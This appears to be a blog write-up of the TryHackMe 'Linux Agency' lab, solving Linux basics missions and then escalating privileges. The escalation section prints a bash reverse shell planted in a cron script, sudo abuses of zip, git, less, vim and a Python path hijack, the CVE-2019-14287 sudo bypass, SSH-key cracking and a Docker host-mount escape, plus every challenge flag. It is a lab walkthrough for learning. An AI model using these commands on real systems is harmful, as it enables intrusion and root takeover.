---
title: "Linux Agency: TryHackMe"
date: 2026-10-18
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux-agency, linux]
---
# Linux Agency: TryHackMe


Agent 47, welcome to the ICA Linux Agency. This room tests Linux fundamentals. Each mission flag is the password for the next mission account.


**Initial SSH credential:**
Username: `agent47`
Password: `640509040147`


Wait about a minute after starting the room machine, replace `TARGET_IP` with its address, then connect as `agent47`:
```sh
ssh agent47@TARGET_IP
```

## Linux Fundamentals
### agent47
![Screenshot](images/Pasted%20image%2020260824184009.png)
Logging in shows the mission1 flag.

**Mission flag (also the next password):**

```
mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```



Use the flag to switch to the mission1 account: 
```
su mission1
```

### mission1
![Screenshot](images/Pasted%20image%2020260824184527.png){: width="358" }
After logging in, we can see that we're still in the user agent47 directory. I simply run 
`cd /home/mission1` . Then I run **ls** and already got the second flag for mission2.
![Screenshot](images/Pasted%20image%2020260824184805.png)

**Mission flag (also the next password):**

```
mission2{8a1b68bb11e4a35245061656b5b9fa0d}
```



### mission2
![Screenshot](images/Pasted%20image%2020260824185308.png)
I checked what's inside the folder using **ls**
![Screenshot](images/Pasted%20image%2020260824185343.png)
then **cat** the file `flag.txt`
![Screenshot](images/Pasted%20image%2020260824185415.png)

**Mission flag (also the next password):**

```
mission3{ab1e1ae5cba688340825103f70b0f976}
```



### mission3
![Screenshot](images/Pasted%20image%2020260824185703.png)
Again we have the file.txt but after printing the content of the file, we get this issue.
![Screenshot](images/Pasted%20image%2020260824185751.png)
I searched the home directory but did not find the flag. Opening the file in **nano** made the non-printable content visible.
![Screenshot](images/Pasted%20image%2020260824193810.png)
The file contains a non-printable character. The **strings** command can also reveal printable text embedded in the file.
```
strings flag.txt
```
![Screenshot](images/Pasted%20image%2020260824193942.png)

**Mission flag (also the next password):**

```
mission4{264a7eeb920f80b3ee9665fafb7ff92d}
```



### mission4 
![Screenshot](images/Pasted%20image%2020260824194226.png)
I checked the flag folder
![Screenshot](images/Pasted%20image%2020260824194257.png)
I printed the  flag.txt and got the flag.
![Screenshot](images/Pasted%20image%2020260824194322.png)

**Mission flag (also the next password):**

```
mission5{bc67906710c3a376bcc7bd25978f62c0}
```



### mission5
![Screenshot](images/Pasted%20image%2020260824194509.png)
No file appeared in the listing, so I checked for hidden files.
![Screenshot](images/Pasted%20image%2020260824194552.png)
We got .flag.txt
![Screenshot](images/Pasted%20image%2020260824194612.png)

**Mission flag (also the next password):**

```
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```



### mission6
![Screenshot](images/Pasted%20image%2020260824194700.png)
This time, we get a hidden folder called `.flag`
![Screenshot](images/Pasted%20image%2020260824194759.png)

**Mission flag (also the next password):**

```
mission7{53fd6b2bad6e85519c7403267225def5}
```



### mission7
![Screenshot](images/Pasted%20image%2020260824195025.png)
The flag was simply sitting in the home directory. So I use **cat** to print the content of the file.
![Screenshot](images/Pasted%20image%2020260824195039.png)

**Mission flag (also the next password):**

```
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
```



### mission8
![Screenshot](images/Pasted%20image%2020260824195229.png)
Here we don't see any signs of the flag. Now what we can do is use the **find** command.
![Screenshot](images/Pasted%20image%2020260824195405.png)
Now we got the flag

**Mission flag (also the next password):**

```
mission9{ba1069363d182e1c114bef7521c898f5}
```



### mission9
![Screenshot](images/Pasted%20image%2020260824195531.png)
I've heard of rockyou.txt before and I know that the name was from a password dictionary file. So first I tried to check if it was really a dictionary file so I used the command `cat rockyou.txt | less`
![Screenshot](images/Pasted%20image%2020260824200018.png)
Turned out it was a password dictionary file. So if the mission10 flag is inside this dictionary file, I could simply use `cat rockyou.txt | grep mission10`
![Screenshot](images/Pasted%20image%2020260824200207.png)
Now we got the mission10 flag.

**Mission flag (also the next password):**

```
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```



### mission10
![Screenshot](images/Pasted%20image%2020260824200322.png)
When I checked the contents of the folders, it showed 10 folders.
![Screenshot](images/Pasted%20image%2020260824201041.png)
So instead I run, 
```
find / -name "flag.txt" 2>/dev/null
```
And showed that the flag.txt was inside `/home/mission10/folder/L4D8/L3D7/L2D2/L1D10/flag.txt`
![Screenshot](images/Pasted%20image%2020260824201306.png)

**Mission flag (also the next password):**

```
mission11{db074d9b68f06246944b991d433180c0}
```



### mission11
This time the flag is hidden inside an environment variable, not a file
![Screenshot](images/Pasted%20image%2020260824202320.png)
So, I simply used
```
env | grep mission12
```

**Mission flag (also the next password):**

```
mission12{f449a1d33d6edc327354635967f9a720}
```



### mission12
![Screenshot](images/Pasted%20image%2020260824204639.png)
We can see that the flag.txt has no file permissions at all and the file is also owned by the user mission12.
Since we're using user mission12, we can add permission to that file using
```
chmod 777 flag.txt
```
![Screenshot](images/Pasted%20image%2020260824205021.png)
Now that we added permissions to it, we now can print the contents of the file.
![Screenshot](images/Pasted%20image%2020260824205202.png)

**Mission flag (also the next password):**

```
mission13{076124e360406b4c98ecefddd13ddb1f}
```



### mission13
![Screenshot](images/Pasted%20image%2020260824205315.png)
The value in `flag.txt` is Base64-encoded. I decoded it with **base64**:
```
cat flag.txt | base64 -d
```
![Screenshot](images/Pasted%20image%2020260824205545.png)

**Mission flag (also the next password):**

```
mission14{d598de95639514b9941507617b9e54d2}
```



### mission14
![Screenshot](images/Pasted%20image%2020260824211113.png)
We can see the flag is in binary and we can convert it using 
```
python3 -c "b='01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101';print(''.join(chr(int(b[i:i+8],2)) for i in range(0,len(b),8)))"
```
![Screenshot](images/Pasted%20image%2020260824211903.png)

**Mission flag (also the next password):**

```
mission15{fc4915d818bfaeff01185c3547f25596}
```



### mission15
![Screenshot](images/Pasted%20image%2020260824212410.png)
The flag is hex-encoded. Convert it back to bytes with `xxd -r -p`.
![Screenshot](images/Pasted%20image%2020260824222013.png)

### mission16
![Screenshot](images/Pasted%20image%2020260824222410.png)
I checked the file type of the file and we see that it's an executable file.
![Screenshot](images/Pasted%20image%2020260824224501.png)
Now we should check the permissions of the file.
![Screenshot](images/Pasted%20image%2020260824225523.png)
We see that the flag file has a read-only permission and is owned by mission16, our current user, we can add a permission to it using 
```
chmod u+x flag
```
which adds a permission to our user/owner for executing the file. Then we can run it using
```
./flag
```

**Mission flag (also the next password):**

```
mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```



### mission17
![Screenshot](images/Pasted%20image%2020260824230703.png)
Here we have a java file and it already handles decryption of the flag and we just have to compile and then run it. We can do that by
![Screenshot](images/Pasted%20image%2020260824231314.png)

**Mission flag (also the next password):**

```
mission18{f09760649986b489cda320ab5f7917e8}
```



### mission18
![Screenshot](images/Pasted%20image%2020260824235349.png)
In the ruby file, we can see that the code already has the encrypted text and it decrypts it at the same when we run it.

**Mission flag (also the next password):**

```
mission19{a0bf41f56b3ac622d808f7a4385254b7}
```



### mission19
![Screenshot](images/Pasted%20image%2020260825003311.png)
Same as mission 18, we just need to compile and run it.

**Mission flag (also the next password):**

```
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```



### mission20
![Screenshot](images/Pasted%20image%2020260825003434.png)

**Mission flag (also the next password):**

```
mission21{7de756aabc528b446f6eb38419318f0c}
```



### mission21
![Screenshot](images/Pasted%20image%2020260825010902.png)
At first it looked weird, so I tried checking  what shell I was using and turned out I was using only the bourne shell or sh.
Then I tried running bash and got the flag.

**Mission flag (also the next password):**

```
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```



### mission22
![Screenshot](images/Pasted%20image%2020260825011556.png)
After loggin in as mission22 see that we're inside a python REPL. We need to escape from here to bash.
We can use the pty module to spawn a terminal
First we added the 
`import pty` - which imports the pty library
Then we can spawn a shell
`pty.spawn("/bin/bash")` - to spawn a shell.

**Mission flag (also the next password):**

```
mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
```



### mission23
![Screenshot](images/Pasted%20image%2020260825131746.png)
So I started looking for a file named `hosts` 
![Screenshot](images/Pasted%20image%2020260825135117.png)
![Screenshot](images/Pasted%20image%2020260825135140.png)
I saw `mission24.com` in `/etc/hosts`, so I used **curl** to check whether the flag was on that website.
```
curl mission24.com
```
![Screenshot](images/Pasted%20image%2020260825135420.png)
As soon as I used **curl**, the website returned hundreds of lines of HTML.
I used **grep** to search for the flag.
![Screenshot](images/Pasted%20image%2020260825135527.png)

**Mission flag (also the next password):**

```
mission24{dbaeb06591a7fd6230407df3a947b89c}
```



### mission24
![Screenshot](images/Pasted%20image%2020260825135625.png)
Since the color of the text is green it might be an executable file so I checked it using **file** command. So I tried running it.
![Screenshot](images/Pasted%20image%2020260825135736.png)
Then I tried tracing what the file doesusing **ltrace** when it executes because it could be doing other than printing the texts.
![Screenshot](images/Pasted%20image%2020260825142318.png)
We can see from here that whenever the file is executed it is checking for the environment variable pocket and init. The output earlier says that `Put some money in his pocket` , to do that, we can try to add a number in that env by
```
export pocket=10
```
![Screenshot](images/Pasted%20image%2020260825142713.png)
It looks like it's still the same, let's try putting the word `money` in the env `pocket`
![Screenshot](images/Pasted%20image%2020260825142825.png)

**Mission flag (also the next password):**

```
mission25{61b93637881c87c71f220033b22a921b}
```



### mission25
![Screenshot](images/Pasted%20image%2020260825161526.png)
I tried using **ls** but it didn't work so I used **echo** for now to check what's inside the current directory. We can see that we have a file called `flag.txt` so I tried using **cat** to print its contents, but that didn't work. I used **which** to check whether **cat** was installed.
![Screenshot](images/Pasted%20image%2020260825161951.png)
That didn't also work, so it might be an issue with the environment variable `PATH` so I checked it.
![Screenshot](images/Pasted%20image%2020260825162103.png)
It looks like we don't have a `PATH` set, we can easily set a path for it using
```
export PATH=/bin
```
![Screenshot](images/Pasted%20image%2020260825162152.png)

**Mission flag (also the next password):**

```
mission26{cb6ce977c16c57f509e9f8462a120f00}
```



### mission26
![Screenshot](images/Pasted%20image%2020260825162311.png)
The flag was in a JPEG. I couldn't view the image in the shell, so I used **strings** to look for readable text inside it:
```
strings flag.jpg | grep mission
```
![Screenshot](images/Pasted%20image%2020260825162747.png)
Then we got the flag!

**Mission flag (also the next password):**

```
mission27{444d29b932124a48e7dddc0595788f4d}
```



### mission27
![Screenshot](images/Pasted%20image%2020260825163122.png)
The filename has a long chain of extensions, so I used **file** to check its actual format. It reported gzip data. I decompressed it with **gzip**'s `-d` option:
![Screenshot](images/Pasted%20image%2020260825163409.png)
After decompression, **file** identified it as GIF image data. I used **strings** again to search for readable text:
```
strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png | grep mission
```
![Screenshot](images/Pasted%20image%2020260825163656.png)

**Mission flag (also the next password):**

```
mission28{03556f8ca983ef4dc26d2055aef9770f}
```



### mission28
![Screenshot](images/Pasted%20image%2020260825163943.png)
After logging in, we're dropped in a Ruby REPL and we can escape to bash using
```
exec "/bin/bash"
```
![Screenshot](images/Pasted%20image%2020260825164501.png)
Now we can see that the flag is reversed, we can simply use the command **rev** to reverse the text.
```
rev txt.galf
```
![Screenshot](images/Pasted%20image%2020260825164642.png)

**Mission flag (also the next password):**

```
mission29{8192b05d8b12632586e25be74da2fff1}
```



### mission29
![Screenshot](images/Pasted%20image%2020260825164943.png)
![Screenshot](images/Pasted%20image%2020260825165003.png)
We can see that there are 4 files, 2 of the which are hidden and 5 folders. We can simply run 
```
grep -r "mission30"
```
to try and find the flag.
![Screenshot](images/Pasted%20image%2020260825165123.png)
We can see that the flag was stored in one of the hidden files named `.htpasswd`

**Mission flag (also the next password):**

```
mission30{d25b4c9fac38411d2fcb4796171bda6e}
```



### mission30
![Screenshot](images/Pasted%20image%2020260825165402.png)
We see that there's a folder named `Escalator`
To not waste time I simply run 
```
grep -r "viktor" Escalator/
```
![Screenshot](images/Pasted%20image%2020260825165524.png)

```
viktor{b52c60124c0f8f85fe647021122b3d9a}
```


# Privilege Escalation
## viktor
![Screenshot](images/Pasted%20image%2020260825172705.png)
![Screenshot](images/Pasted%20image%2020260825172645.png)
We see that there's a script in `opt/scripts/47.sh` that is being run every minute by the user `dalia`.
![Screenshot](images/Pasted%20image%2020260825172757.png)
![Screenshot](images/Pasted%20image%2020260825190449.png)
```
vi script.sh
```
```
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/9999 0>&1
```

![Screenshot](images/Pasted%20image%2020260825192449.png)
We copy the output of this then we replace the contents of `/opt/scripts/47.sh`
```
echo 'IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYxCg==' | base64 -d > /opt/scripts/47.sh
```
Then we run:
```
nc -nlvp 9999
```
![Screenshot](images/Pasted%20image%2020260825192816.png)
![Screenshot](images/Pasted%20image%2020260825192833.png)

```
dalia{4a94a7a7bb4a819a63a33979926c77dc}
```


## dalia
![Screenshot](images/Pasted%20image%2020260825200023.png)
![Screenshot](images/Pasted%20image%2020260825201716.png)
![Screenshot](images/Pasted%20image%2020260825200152.png)
```
GG=$(mktemp -u)  
sudo -u silvio zip $GG /etc/hosts -T -TT 'sh #'
```
The **sudo** rule let me run **zip** as `silvio`. The `-T` option runs an archive test, and `-TT` lets me choose the command used for that test ([Info-ZIP manual](https://manpages.debian.org/trixie/zip/zip.1.en.html)). I set it to `sh #` and got a shell as `silvio`, which I confirmed with `id`:
![Screenshot](images/Pasted%20image%2020260825200355.png)

```
silvio{657b4d058c03ab9988875bc937f9c2ef}
```


## silvio
![Screenshot](images/Pasted%20image%2020260825211532.png)
```
SHELL=/bin/bash script -q /dev/null
```
![Screenshot](images/Pasted%20image%2020260825211601.png)
![Screenshot](images/Pasted%20image%2020260825211616.png)
![Screenshot](images/Pasted%20image%2020260825211628.png)
```
sudo -u reza PAGER='sh -c "exec sh -i" <&1' git -p help
```
![Screenshot](images/Pasted%20image%2020260825211707.png)
![Screenshot](images/Pasted%20image%2020260825212109.png)
When I run **bash** to have an interactive shell. 
![Screenshot](images/Pasted%20image%2020260825212223.png)

```
reza{2f1901644eda75306f3142d837b80d3e}
```


## reza
![Screenshot](images/Pasted%20image%2020260825222403.png)
The `reza` account can run `/opt/scripts/Gun-Shop.py` as `jordan`. The script imports a Python module from a path that can be influenced through `PYTHONPATH`.
![Screenshot](images/Pasted%20image%2020260825222615.png)
```
mkdir /tmp/shop
```
![Screenshot](images/Pasted%20image%2020260825223519.png)
```
echo 'import os; os.system("/bin/bash -i")' > /tmp/shop/shop.py
```
![Screenshot](images/Pasted%20image%2020260826000414.png)
```
sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
```
![Screenshot](images/Pasted%20image%2020260826000438.png)
Here we see that the flag is reversed. We can reverse it using the command **rev**
![Screenshot](images/Pasted%20image%2020260826000509.png)

```
jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
```


## jordan
![Screenshot](images/Pasted%20image%2020260826000813.png)
![Screenshot](images/Pasted%20image%2020260826000916.png)
We can use this to escalate our privileges.
![Screenshot](images/Pasted%20image%2020260826001201.png)
```
sudo -u ken less /etc/hosts
!/bin/sh
```
Now we're inside the user `ken`
![Screenshot](images/Pasted%20image%2020260826001254.png)

```
ken{4115bf456d1aaf012ed4550c418ba99f}
```


## ken
![Screenshot](images/Pasted%20image%2020260826001344.png)
![Screenshot](images/Pasted%20image%2020260826001419.png)
![Screenshot](images/Pasted%20image%2020260826002340.png)
![Screenshot](images/Pasted%20image%2020260826002347.png)
```
sudo -u sean vim -c ':!/bin/bash'
```
I found the Sean flag in `/var/log/syslog.bak`. A Base64-encoded value beside it gave me the password for the next account after I decoded it.

**Sean flag and next account credential:**
Flag:

```
sean{4c5685f4db7966a43cf8e95859801281}
```

Password for `penelope`: `p3nelope`



## sean
I used that decoded password to switch to `penelope` and read her flag:
![Screenshot](images/Pasted%20image%2020260826123049.png)

```
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
```




## penelope
![Screenshot](images/Pasted%20image%2020260826145126.png)
The `base64` program in this home directory is owned by `maya` and has both setuid and setgid bits. That let it read Maya's flag file when I ran it:
```
LFILE=/home/maya/flag.txt  
./base64 "$LFILE" | base64 -d
```
The output was Maya's flag:
![Screenshot](images/Pasted%20image%2020260826151913.png)
![Screenshot](images/Pasted%20image%2020260826154325.png)

```
maya{a66e159374b98f64f89f7c8d458ebb2b}
```


## maya
![Screenshot](images/Pasted%20image%2020260826144419.png)
Here I used the flag as the password because the hint says `flag==password`.
![Screenshot](images/Pasted%20image%2020260826154526.png)
![Screenshot](images/Pasted%20image%2020260826154620.png)
![Screenshot](images/Pasted%20image%2020260826160502.png)
I copied Robert's private key from Maya's home directory to my attack machine, then used **ssh2john** and **john** to recover its passphrase:
```sh
scp maya@TARGET_IP:/home/maya/old_robert_ssh/id_rsa ./id_rsa_robert
ssh2john id_rsa_robert > id_rsa_robert.txt
john id_rsa_robert.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4
```
![Screenshot](images/Pasted%20image%2020260826170924.png)
![Screenshot](images/Pasted%20image%2020260826172934.png)


**Recovered private-key passphrase:**

```
industryweapon
```



## robert
The `elusive_targets.txt` file said Robert had an entry point on localhost, so I checked the listening ports:
```
ss -tulnp
```
![Screenshot](images/Pasted%20image%2020260826174001.png)
The output showed a listener on `127.0.0.1:2222`. I tried the recovered value at Robert's SSH password prompt on that port:
```sh
ssh robert@localhost -p 2222
```
![Screenshot](images/Pasted%20image%2020260826174439.png)
The login succeeded, and I found the sudo version was `1.8.21p2`:
![Screenshot](images/Pasted%20image%2020260826180337.png)
I tried the UID handling issue described in [CVE-2019-14287](https://ubuntu.com/security/CVE-2019-14287):
![Screenshot](images/Pasted%20image%2020260826180429.png)
```sh
sudo -u#-1 /bin/bash
```
![Screenshot](images/Pasted%20image%2020260826180221.png)
The prompt changed to `root`. I read the user flag from `/root/user.txt`:
```sh
cat /root/user.txt
```
![Screenshot](images/Pasted%20image%2020260826180544.png)

**User flag:**

```
user{620fb94d32470e1e9dcf8926481efc96}
```






## user.txt
I searched for `root.txt`, but it wasn't in this environment:
```sh
find / -name "root.txt" 2>/dev/null
```
![Screenshot](images/Pasted%20image%2020260826181537.png)
The `top` output didn't show a Docker daemon. The hint said `blue whale`, so I looked for Docker-related files:
![Screenshot](images/Pasted%20image%2020260826181218.png)
```sh
find / -name "docker" 2>/dev/null
```
![Screenshot](images/Pasted%20image%2020260826181324.png)
This found `/run/docker` and `/tmp/docker`.
![Screenshot](images/Pasted%20image%2020260826181428.png)
There was no `root.txt` under `/run/docker` either:
```sh
find /run/docker -name "root.txt" 2>/dev/null
```
![Screenshot](images/Pasted%20image%2020260826181732.png)
The `/tmp/docker` file was an ordinary executable owned by `root:robert`; it did not have the SUID bit.
![Screenshot](images/Pasted%20image%2020260826182309.png)
I checked Docker's container example on GTFOBins:
![Screenshot](images/Pasted%20image%2020260826182239.png)
I tried the Docker client with Alpine first. The image was not available locally, and the pull timed out:
```sh
cd /tmp
./docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
![Screenshot](images/Pasted%20image%2020260826182421.png)
The client could reach a Docker daemon. I listed the images and found `mangoman`:
```sh
./docker images
```
![Screenshot](images/Pasted%20image%2020260826182700.png)
I used the available image to mount the host's `/` at `/mnt`, then opened a shell with **chroot**:
```sh
./docker run -v /:/mnt --rm -it mangoman chroot /mnt /bin/sh
```
![Screenshot](images/Pasted%20image%2020260826182919.png)
From the new shell, I read the host's root flag:
```sh
cd /root
ls
cat root.txt
```
![Screenshot](images/Pasted%20image%2020260826183034.png)

**Root flag:**

```
root{62ca2110ce7df377872dd9f0797f8476}
```


## Findings

I used the mission flags to switch between the early accounts. Later, I used **sudo** rules and a Python module path I could control to move between users. Robert's sudo command gave me a root shell in the current environment, where I read `/root/user.txt`. The Docker client then listed the `mangoman` image; running it with the host root mounted at `/mnt` let me use **chroot** and read the separate root flag.

## What I Learned

This room got easier when I checked who I was, which files I could run, and what **sudo** let me do. I used **strings** to search for readable text in image files ([GNU strings guide](https://sourceware.org/binutils/docs/binutils/strings.html)). The `sudo -u#-1` result matched the UID handling issue in [CVE-2019-14287](https://ubuntu.com/security/CVE-2019-14287). The Docker step showed me that a client with access to a powerful daemon can expose host files through a bind mount ([Docker run guide](https://docs.docker.com/engine/containers/run/), [Docker security notes](https://docs.docker.com/engine/security/)). Room: [TryHackMe Linux Agency](https://tryhackme.com/room/linuxagency).
